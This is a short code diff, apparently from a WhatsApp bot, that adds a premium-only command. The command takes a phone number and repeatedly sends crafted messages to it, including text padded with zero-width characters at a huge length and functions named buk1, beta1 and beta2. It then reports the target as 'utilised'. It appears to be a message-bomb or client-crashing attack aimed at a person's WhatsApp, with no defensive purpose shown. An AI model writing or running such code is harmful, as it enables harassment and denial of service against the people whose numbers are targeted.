@@ -561,10 +561,20 @@ if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
-for (let i = 0; i < 2; i++) {
-await sendRp(target, fake)
-await sendRp(target, fake)
-await sendP(target, fake)
+// Function to convert text to invisible characters
+    const toInvisibleText = (text) => {
+        return text.split('').map(char => 'u200B' + char).join('');
+    };
+
+    const invisibleText = toInvisibleText("SPIDER");
+
+    for (let i = 0; i < 2; i++) {
+        await buk1(sam, target, invisibleText, 1020000, true);
+        await sendRp(target, wanted);
+        await sendRp(target, fake);
+        await beta2(sam, target, fake);
+        await sendP(target, fake);
+        await beta1(sam, target, fake);
 }
 reply(`⫹𝐒𝐏𝐈𝐃𝐄𝐑 𝐔𝐓𝐈𝐋𝐈𝐒𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐅𝐔𝐋⫺
 
